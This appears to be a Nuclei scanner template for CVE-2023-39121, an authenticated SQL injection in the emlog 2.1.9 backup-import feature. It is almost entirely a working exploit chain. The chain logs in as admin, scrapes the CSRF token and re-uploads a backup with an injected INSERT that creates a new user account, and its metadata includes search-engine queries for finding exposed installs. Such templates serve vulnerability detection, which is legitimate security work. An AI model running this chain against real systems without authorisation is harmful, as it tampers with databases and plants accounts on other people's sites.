flow: http(1) && http(2) && http(3) && http(4) && http(5)
http:
- raw:
  - 'POST /admin/account.php?action=dosignin&s= HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user={{username}}&pw={{password}}

    '
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - name="token" id="token" value="([a-f0-9]{40})"
    type: regex
  raw:
  - 'GET /admin/data.php HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - dsl:
    - body
    internal: true
    name: full_response
    type: dsl
  raw:
  - 'POST /admin/data.php?action=backup HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    token={{token}}

    '
- raw:
  - 'POST /admin/data.php?action=import HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUBHhE8PS934oJ2MP


    ------WebKitFormBoundaryUBHhE8PS934oJ2MP

    Content-Disposition: form-data; name="token"


    {{token}}

    ------WebKitFormBoundaryUBHhE8PS934oJ2MP

    Content-Disposition: form-data; name="sqlfile"; filename="emlog_test.sql"

    Content-Type: application/octet-stream


    {{full_response}}

    INSERT INTO emlog_user VALUES(''{{rand_uid}}'',''sqli{{rand_marker}}'',''$P$BnTaZnToynOoAVP6T/MiTsZc9ZAQNg.'',''test'',''writer'',''n'','''',''sqli{{rand_marker}}@test.com'','''','''',''0'',''1687261845'',''1687261845'');

    ------WebKitFormBoundaryUBHhE8PS934oJ2MP--

    '
- matchers:
  - dsl:
    - contains(body, concat("sqli", rand_marker))
    type: dsl
  raw:
  - 'GET /admin/user.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-39121
info:
  author: wjch611
  classification:
    cpe: cpe:2.3:a:emlog:emlog:2.1.9:-:*:*:*:*:*:*
    cve-id: CVE-2023-39121
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cwe-id: CWE-89
    epss-percentile: 0.82468
    epss-score: 0.01838
  description: 'emlog v2.1.9 contains a SQL injection caused by unsanitized input
    in the data backup/restore functionality, allowing attackers to execute arbitrary
    SQL commands through crafted backup files.

    '
  impact: 'Attackers with admin credentials can execute arbitrary SQL commands, potentially
    leading to privilege escalation, data leakage, modification, or deletion.

    '
  metadata:
    fofa-query: title="emlog"
    google-query: intitle:"emlog"
    max-request: 5
    product: emlog
    shodan-query: http.title:"emlog"
    vendor: emlog
    verified: true
  name: Emlog 2.1.9 - SQL Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-39121
  - https://github.com/safe-b/CVE/issues/1#issue-1817133689
  remediation: 'Update to the latest version of emlog or apply security patches addressing
    the SQL injection vulnerability.

    '
  severity: high
  tags: cve2023,cve,sqli,emlog,authenticated
variables:
  rand_marker: '{{rand_int(100000, 999999)}}'
  rand_uid: '{{rand_int(10000, 99999)}}'
